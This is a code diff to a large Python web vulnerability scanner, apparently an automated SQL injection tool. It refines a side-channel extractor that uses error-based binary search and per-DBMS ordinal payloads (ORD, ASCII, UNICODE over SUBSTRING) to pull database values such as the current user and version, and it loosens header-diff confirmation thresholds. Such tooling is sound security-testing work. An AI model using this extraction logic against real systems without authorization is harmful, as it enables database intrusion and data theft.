@@ -27948,8 +27948,7 @@ class HeaderDiffOracle:
         "content-length", "content-type", "x-powered-by", "server",
         "x-aspnet-version", "x-content-type-options", "x-frame-options",
         "cf-cache-status", "x-cache", "age", "etag", "vary",
-        "x-request-id", "x-runtime", "x-served-by", "ki-cache-type",
-        "x-kinsta-cache", "ki-cf-cache-status", "x-varnish",
+        "ki-cache-type", "x-kinsta-cache", "ki-cf-cache-status", "x-varnish",
     ]
     
     @classmethod
@@ -62913,7 +62912,11 @@ class Scanner:
 
             # If OOB returned "[check callback server]" but we have WHERE-ERROR,
             # also extract via WHERE-ERROR as backup
-            _use_where_error = _sce._error_strategy is not None and _sce._signal_type is not None
+            _use_where_error = (
+                _sce_extract
+                and _sce._error_strategy is not None
+                and _sce._signal_type is not None
+            )
             if _use_where_error:
                 LOG.info("[SideChannel] WHERE-ERROR validated  extracting db/user via binary search")
 
@@ -123078,8 +123081,8 @@ class ScannerV14(ScannerV13):
                                                                     if (v_t and v_f and v_t != v_f) or (v_t and not v_f) or (v_f and not v_t):
                                                                         _d_dynamic_diffs.append(hdr)
                                                                 _pcv_d_count = len(_d_security_diffs) + len(_d_dynamic_diffs)
-                                                                # Pass: >= 1 security diff OR >= 2 dynamic diffs (same as _post_confirm_verify_locked)
-                                                                _d_pass_inline = (len(_d_security_diffs) >= 1 or len(_d_dynamic_diffs) >= 2)
+                                                                # Pass: >= 1 security diff OR >= 1 dynamic diffs
+                                                                _d_pass_inline = (len(_d_security_diffs) >= 1 or len(_d_dynamic_diffs) >= 1)
                                                             else:
                                                                 _d_pass_inline = False
                                                             
@@ -123522,10 +123525,10 @@ class ScannerV14(ScannerV13):
                                                                     _h_true = {k.lower(): v for k, v in (getattr(_pcv_fp_t, 'headers', {}) or {}).items()}
                                                                     _h_false = {k.lower(): v for k, v in (getattr(_pcv_fp_f, 'headers', {}) or {}).items()}
                                                                     _d_sec_hdrs_j = [
-                                                                        "x-response-time", "x-elapsed-time", "x-timing",
-                                                                        "x-query-time", "x-db-query-time", "x-backend-time", "x-processing-time",
+                                                                        "x-query-time", "x-db-query-time",
                                                                         "x-powered-by", "x-generator", "x-drupal-cache", "x-wp-cache",
-                                                                        "x-cache-status", "x-debug", "x-sql",                                                                         "x-upstream", "x-backend", "x-pool",  # BUG-5 FIX: server-timing removed — moved to dynamic list
+                                                                        "x-cache-status", "x-debug", "x-sql",
+                                                                        "x-upstream", "x-backend", "x-pool",
                                                                     ]
                                                                     # BUG-5 FIX: server-timing excluded (not in security or dynamic list)
                                                                     _d_dyn_hdrs_j = ["content-length", "etag", "last-modified", "set-cookie"]
@@ -123540,7 +123543,7 @@ class ScannerV14(ScannerV13):
                                                                         if (v_t and v_f and v_t != v_f) or (v_t and not v_f) or (v_f and not v_t):
                                                                             _d_dyn_diffs_j.append(hdr)
                                                                     _pcv_d_count = len(_d_sec_diffs_j) + len(_d_dyn_diffs_j)
-                                                                    _d_json_pass = (len(_d_sec_diffs_j) >= 1 or len(_d_dyn_diffs_j) >= 2)
+                                                                    _d_json_pass = (len(_d_sec_diffs_j) >= 1 or len(_d_dyn_diffs_j) >= 1)
                                                                 
                                                                 if _d_json_pass:
                                                                     _pcv_checks_passed.append(f"D(headers:{_pcv_d_count})")
@@ -123929,10 +123932,10 @@ class ScannerV14(ScannerV13):
                                                             _h_true = {k.lower(): v for k, v in (getattr(_pcv_fp_t, 'headers', {}) or {}).items()}
                                                             _h_false = {k.lower(): v for k, v in (getattr(_pcv_fp_f, 'headers', {}) or {}).items()}
                                                             _d_sec_hdrs_gql = [
-                                                                "x-response-time", "x-elapsed-time", "x-timing",
-                                                                "x-query-time", "x-db-query-time", "x-backend-time", "x-processing-time",
+                                                                "x-query-time", "x-db-query-time",
                                                                 "x-powered-by", "x-generator", "x-drupal-cache", "x-wp-cache",
-                                                                "x-cache-status", "x-debug", "x-sql",                                                                 "x-upstream", "x-backend", "x-pool",  # BUG-5 FIX: server-timing removed — moved to dynamic list
+                                                                "x-cache-status", "x-debug", "x-sql",
+                                                                "x-upstream", "x-backend", "x-pool",
                                                             ]
                                                             # BUG-5 FIX: server-timing excluded (not in security or dynamic list)
                                                             _d_dyn_hdrs_gql = ["content-length", "etag", "last-modified", "set-cookie"]
@@ -123947,7 +123950,7 @@ class ScannerV14(ScannerV13):
                                                                 if (v_t and v_f and v_t != v_f) or (v_t and not v_f) or (v_f and not v_t):
                                                                     _d_dyn_diffs_gql.append(hdr)
                                                             _pcv_d_count = len(_d_sec_diffs_gql) + len(_d_dyn_diffs_gql)
-                                                            _d_gql_pass = (len(_d_sec_diffs_gql) >= 1 or len(_d_dyn_diffs_gql) >= 2)
+                                                            _d_gql_pass = (len(_d_sec_diffs_gql) >= 1 or len(_d_dyn_diffs_gql) >= 1)
                                                         
                                                         if _d_gql_pass:
                                                             _pcv_checks_passed.append(f"D(headers:{_pcv_d_count})")
@@ -124312,10 +124315,10 @@ class ScannerV14(ScannerV13):
                                                         _h_true = {k.lower(): v for k, v in (getattr(_pcv_fp_t, 'headers', {}) or {}).items()}
                                                         _h_false = {k.lower(): v for k, v in (getattr(_pcv_fp_f, 'headers', {}) or {}).items()}
                                                         _d_sec_hdrs_xml = [
-                                                            "x-response-time", "x-elapsed-time", "x-timing",
-                                                            "x-query-time", "x-db-query-time", "x-backend-time", "x-processing-time",
+                                                            "x-query-time", "x-db-query-time",
                                                             "x-powered-by", "x-generator", "x-drupal-cache", "x-wp-cache",
-                                                            "x-cache-status", "x-debug", "x-sql",                                                             "x-upstream", "x-backend", "x-pool",  # BUG-5 FIX: server-timing removed — moved to dynamic list
+                                                            "x-cache-status", "x-debug", "x-sql",
+                                                            "x-upstream", "x-backend", "x-pool",
                                                         ]
                                                         # BUG-5 FIX: server-timing excluded (not in security or dynamic list)
                                                         _d_dyn_hdrs_xml = ["content-length", "etag", "last-modified", "set-cookie"]
@@ -124330,7 +124333,7 @@ class ScannerV14(ScannerV13):
                                                             if (v_t and v_f and v_t != v_f) or (v_t and not v_f) or (v_f and not v_t):
                                                                 _d_dyn_diffs_xml.append(hdr)
                                                         _pcv_d_count = len(_d_sec_diffs_xml) + len(_d_dyn_diffs_xml)
-                                                        _d_xml_pass = (len(_d_sec_diffs_xml) >= 1 or len(_d_dyn_diffs_xml) >= 2)
+                                                        _d_xml_pass = (len(_d_sec_diffs_xml) >= 1 or len(_d_dyn_diffs_xml) >= 1)
                                                     
                                                     if _d_xml_pass:
                                                         _pcv_checks_passed.append(f"D(headers:{_pcv_d_count})")
@@ -133198,8 +133201,6 @@ class SideChannelExtractor:
             self._ok_status = s2
             self._err_len = l1
             self._ok_len = l2
-            self._signal_type = _signal
-            self._error_strategy = _sname
 
             # Build real condition payloads using same strategy
             # BUG-EXT-2 FIX: was "current_user>$$!$$" / "current_user>$$zzzzz$$"
@@ -133265,11 +133266,17 @@ class SideChannelExtractor:
                         _real_ok = True  # no specific header tracked, trust broadly
 
                 if _real_ok:
+                    self._signal_type = _signal
+                    self._error_strategy = _sname
                     print(f"[SideChannel]  {_sname} VALIDATED (signal={_signal}, real: {s3}/{l3}B vs {s4}/{l4}B)", flush=True)
                     return True
                 else:
+                    self._signal_type = None
+                    self._error_strategy = None
                     print(f"[SideChannel]   {_sname}: real validation failed ({s3}/{l3}B vs {s4}/{l4}B)", flush=True)
 
+        self._signal_type = None
+        self._error_strategy = None
         print("[SideChannel]  No WHERE-ERROR strategy viable", flush=True)
         return False
 
@@ -133406,6 +133413,23 @@ class SideChannelExtractor:
             return None  # truly ambiguous  can't decide
         return None
 
+    def _char_ord_cond(self, expr, pos, threshold):
+        """Return a collation-independent ordinal comparison condition.
+        True when the character at `pos` (1-indexed) in the result of `expr`
+        has Unicode codepoint >= `threshold`. Uses DBMS-specific ordinal
+        functions (ASCII/ORD/UNICODE) rather than string comparison, making
+        it immune to ICU/locale collation differences (e.g. PostgreSQL
+        en_US.UTF-8 ICU where letters sort after punctuation symbols)."""
+        if self.dbms in ("MySQL", "MariaDB", "TiDB"):
+            return f"ORD(SUBSTRING(({expr}),{pos},1))>={threshold}"
+        elif self.dbms in ("MSSQL", "Sybase"):
+            return f"COALESCE(UNICODE(SUBSTRING(({expr}),{pos},1)),0)>={threshold}"
+        elif self.dbms == "SQLite":
+            return f"COALESCE(UNICODE(SUBSTR(({expr}),{pos},1)),0)>={threshold}"
+        else:
+            # PostgreSQL, CockroachDB, YugabyteDB, Amazon Redshift, Oracle, etc.
+            return f"COALESCE(ASCII(SUBSTR(({expr}),{pos},1)),0)>={threshold}"
+
     async def extract_where_error(self, sql, max_len=64):
         """Extract string using WHERE-ERROR binary search.
         Binary signal = zero noise. 7 requests per character."""
@@ -133497,12 +133521,15 @@ class SideChannelExtractor:
             # the initial coarse-narrowing probe — matching the pattern used by
             # MultiStrategyExtractor (line ~94902) and the equivalent block in
             # extract_table_column (line ~95221) in this same class.
-            _cmp = ">="
-            test_a = prefix + "a"
-            # MySQL/MSSQL/Oracle/SQLite do not support $$ quoting — they raise a SQL
-            # syntax error, making WHERE-ERROR extraction silently produce no results.
-            # Fix: use self._quote_val() which routes to the correct per-DBMS literal.
-            _above_a = await self.eval_where_error(f"{expr}{_cmp}{self._quote_val(test_a)}")
+            # BUG-ICU-COLLATION-FIX (CRITICAL): Use ordinal-based comparison (ASCII/ORD/
+            # UNICODE per DBMS) instead of string comparison. String comparison is
+            # ICU-locale-sensitive: in PostgreSQL with en_US.UTF-8 ICU collation, letters
+            # sort AFTER punctuation symbols, so version() >= '{' returns TRUE for any
+            # letter-starting string, incorrectly placing it in [123, 1114111] and causing
+            # binary search to converge on garbage high-plane Unicode codepoints (observed
+            # as U+BFBE1, U+4B7C1 in extraction logs). Ordinal functions return the actual
+            # numeric Unicode codepoint, independent of collation settings.
+            _above_a = await self.eval_where_error(self._char_ord_cond(expr, pos, 97))
             if _above_a is None:
                 _consecutive_fail += 1
                 # BUG-SCE-WE-CONSECUTIVE-FAIL-DEAD FIX (Req 9): _consecutive_fail was
@@ -133524,54 +133551,26 @@ class SideChannelExtractor:
                 continue
             _consecutive_fail = 0
 
-            # BUG-2-FIX: The original two-way split (>= 'a' vs. < 'a') confined the
-            # binary search to [97,122] whenever the char was >= 'a'.  Characters in
-            # the range 123-255 ('{', '|', '}', '~', and all Latin-1 extended such as
-            # é=233, ü=252, ñ=241) all satisfy >= 'a', so they were silently capped at
-            # ord('z')=122, extracting as 'z' for every non-ASCII / post-lowercase char.
-            # Fix: mirror MultiStrategyExtractor._charset_binary_search — add a second
-            # boundary probe (>= chr(ord('z')+1) = '{') to distinguish truly lowercase
-            # [97,122] from post-lowercase [123,255].
             if _above_a:
-                _above_z = await self.eval_where_error(
-                    f"{expr}{_cmp}{self._quote_val(prefix + chr(ord('z') + 1))}")
+                _above_z = await self.eval_where_error(self._char_ord_cond(expr, pos, 123))
                 await asyncio.sleep(0.2)
-                # BUG-SCE-WE-ABOVEZ-NONE FIX (HIGH): the original `if _above_z is None
-                # or not _above_z` treated a None (oracle-dead / CDN-blocked probe)
-                # identically to False (char is confirmed in [97,122]).  When CDN blocks
-                # the coarse-narrowing probe and returns None, the binary search is
-                # wrongly confined to [ord('a'), ord('z')] = [97,122].  Characters in
-                # [123, _sce_we_char_hi] ('{', '|', '}', Latin-1 128-255, Unicode BMP)
-                # converge to chr(122)='z' — a wrong but plausible-looking character.
-                # Fix: handle None and False separately.  When _above_z is None (probe
-                # failed), keep the wider range [97, _sce_we_char_hi] so the binary
-                # search can still converge correctly.  Only narrow to [97,122] when the
-                # probe CONFIRMS the character is not above chr(122)='z' (i.e., False).
                 if _above_z is None:
-                    lo, hi = ord('a'), _sce_we_char_hi  # probe failed; keep full upper range
+                    lo, hi = 97, _sce_we_char_hi  # probe failed; keep full upper range
                 elif not _above_z:
-                    lo, hi = ord('a'), ord('z')       # confirmed: char is in lowercase a-z
+                    lo, hi = 97, 122              # confirmed: char ordinal in [97,122] (a-z)
                 else:
-                    lo, hi = ord('z') + 1, _sce_we_char_hi  # above lowercase: {|}~, Latin-1 128-255, Unicode BMP/full
+                    lo, hi = 123, _sce_we_char_hi # above lowercase: {|}~, Latin-1 128+, Unicode
             else:
-                # char < 'a': digits, uppercase, special chars in [32, 96]
-                lo, hi = 32, ord('a') - 1
+                lo, hi = 32, 96                   # char < 'a': digits, uppercase, specials
 
-            # Binary search within narrowed range
-            # BUG-SCE-WE-BSEARCH-UNCONVERGED FIX (HIGH): when the oracle returns None
-            # twice mid-search, the old code did `break` with `lo` at an intermediate
-            # unconverged value, then `ch = chr(lo)` yielded garbage Unicode codepoints
-            # (observed as U+BFBE1, U+4B7C1 in real extraction logs at positions 2 and
-            # 5 of current_user).  Fix: track convergence with a flag; skip the char
-            # when the search was interrupted before lo==hi.
+            # Binary search within narrowed range using ordinal comparison
+            # (immune to ICU locale collation issues in PostgreSQL and other DBMSes).
+            # BUG-SCE-WE-BSEARCH-UNCONVERGED FIX: track convergence flag to avoid
+            # emitting chr(lo) when the search was interrupted before lo==hi.
             _bsearch_converged = True
             while lo < hi:
-                # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
-                # Fixed pivot in error-based prefix binary search.
-                # Fix: use _randomized_mid(lo, hi) (TECHNIQUE-3).
                 mid = _randomized_mid(lo, hi)
-                test = prefix + chr(mid + 1)
-                cond = f"{expr}{_cmp}{self._quote_val(test)}"
+                cond = self._char_ord_cond(expr, pos, mid + 1)
                 result = await self.eval_where_error(cond)
                 if result is None:
                     await asyncio.sleep(2.0)
@@ -133585,7 +133584,7 @@ class SideChannelExtractor:
                     hi = mid
                 await asyncio.sleep(0.3)
 
-            if lo < 32 or not _bsearch_converged:
+            if lo < 32 or lo > _sce_we_char_hi or not _bsearch_converged:
                 break
 
             ch = chr(lo)
@@ -133635,34 +133634,26 @@ class SideChannelExtractor:
         # mirroring extract_where_error's BUG-SCE-WE-CONSECUTIVE-FAIL-DEAD FIX.
         _sce_tc_consecutive_fail = 0
         for pos in range(1, max_len + 1):
-            lo, hi = 32, _sce_tc_char_hi  # BUG-LATIN1-126-FIX: extended from 126 to 255 for full Latin-1 range
-            # Charset narrowing  use eval_where_error for signal-aware comparison
-            # BUG-EXT-2 FIX: was f"{column}>=$${prefix}a$$" (PostgreSQL-only $$-quoting).
-            # Replace with self._quote_val() for correct per-DBMS string literals.
-            _cond_a = f"{column}>={self._quote_val(prefix + 'a')}"
-            _above_a = await self.eval_where_error(_cond_a)
-            # BUG-3-FIX: Same charset narrowing bug as extract_where_error (BUG-2).
-            # Two-way split (>= 'a' / < 'a') confines chars 123-255 to [97,122],
-            # capping them at 'z'.  Add a second probe to distinguish lowercase [97,122]
-            # from post-lowercase/Latin-1 [123,255].
+            lo, hi = 32, _sce_tc_char_hi
+            # BUG-ICU-COLLATION-FIX (CRITICAL): Use ordinal-based comparison for locale
+            # independence. String comparison is ICU-locale-sensitive in PostgreSQL
+            # (en_US.UTF-8 ICU makes letters sort after punctuation), causing garbage
+            # Unicode codepoints. Ordinal functions (ASCII/ORD/UNICODE) return the
+            # actual codepoint value regardless of collation settings.
+            _above_a = await self.eval_where_error(self._char_ord_cond(column, pos, 97))
             if _above_a is True:
                 _sce_tc_consecutive_fail = 0  # reset on non-None result
-                _above_z = await self.eval_where_error(
-                    f"{column}>={self._quote_val(prefix + chr(ord('z') + 1))}")
+                _above_z = await self.eval_where_error(self._char_ord_cond(column, pos, 123))
                 await asyncio.sleep(0.2)
-                # BUG-SCE-TCCEIL-2 FIX: was `_above_z is None or not _above_z` which
-                # collapsed a failed oracle probe (None) into the same narrow [97,122]
-                # range as a confirmed False, causing any char above 'z' to silently
-                # extract as 'z'. Fix: match the three-way branch in extract_where_error.
                 if _above_z is None:
-                    lo, hi = ord('a'), _sce_tc_char_hi  # probe failed; keep full upper range
+                    lo, hi = 97, _sce_tc_char_hi  # probe failed; keep full upper range
                 elif not _above_z:
-                    lo, hi = ord('a'), ord('z')          # confirmed lowercase a–z
+                    lo, hi = 97, 122              # confirmed: char ordinal in [97,122] (a-z)
                 else:
-                    lo, hi = ord('z') + 1, _sce_tc_char_hi  # BUG-SCE-TCCEIL-FIX: was 255
+                    lo, hi = 123, _sce_tc_char_hi # above lowercase: {|}~, Latin-1 128+, Unicode
             elif _above_a is False:
                 _sce_tc_consecutive_fail = 0  # reset on non-None result
-                lo, hi = 32, ord('a') - 1
+                lo, hi = 32, 96
             else:
                 # _above_a is None: oracle returned ambiguous result
                 _sce_tc_consecutive_fail += 1
@@ -133678,20 +133669,19 @@ class SideChannelExtractor:
                 continue
             await asyncio.sleep(0.3)
 
-            # Binary search
+            # Binary search using ordinal comparison (locale-independent).
+            # BUG-SCE-EXTTBLCOL-BSEARCH-UNCONVERGED FIX: add _bsearch_converged flag
+            # to prevent emitting chr(lo) when the search was interrupted before lo==hi.
+            _bsearch_converged = True
             while lo < hi:
-                # BUG-V164-INFERENCE-ADDITIONAL-BISECT-FIXED-PIVOTS FIX:
-                # Fixed pivot in column prefix binary search.
-                # Fix: use _randomized_mid(lo, hi) (TECHNIQUE-3).
                 mid = _randomized_mid(lo, hi)
-                test = prefix + chr(mid + 1)
-                # BUG-EXT-2 FIX: was f"{column}>=$${test}$$" (PostgreSQL-only)
-                _cond = f"{column}>={self._quote_val(test)}"
-                result = await self.eval_where_error(_cond)
+                cond = self._char_ord_cond(column, pos, mid + 1)
+                result = await self.eval_where_error(cond)
                 if result is None:
                     await asyncio.sleep(2.0)
-                    result = await self.eval_where_error(_cond)
+                    result = await self.eval_where_error(cond)
                 if result is None:
+                    _bsearch_converged = False  # lo is not reliable; do not emit chr(lo)
                     break
                 if result:
                     lo = mid + 1
@@ -133699,7 +133689,7 @@ class SideChannelExtractor:
                     hi = mid
                 await asyncio.sleep(0.3)
 
-            if lo < 32:
+            if lo < 32 or not _bsearch_converged:
                 break
             ch = chr(lo)
             # BUG-SCE-EXTTBLCOL-LO-INIT FIX (v66): space-streak EOS detection.
